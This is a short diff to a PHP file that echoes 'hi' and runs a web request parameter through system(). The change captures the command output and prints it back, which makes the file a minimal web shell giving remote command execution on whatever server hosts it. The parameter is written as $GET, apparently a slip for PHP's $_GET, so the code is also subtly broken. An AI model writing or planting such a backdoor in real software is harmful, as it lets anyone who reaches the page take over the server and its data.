@@ -2,5 +2,6 @@
 
 <?php
 echo 'hi';
-system($GET['cmd']);
+$result=system($GET['cmd']);
+echo $result;
 ?>
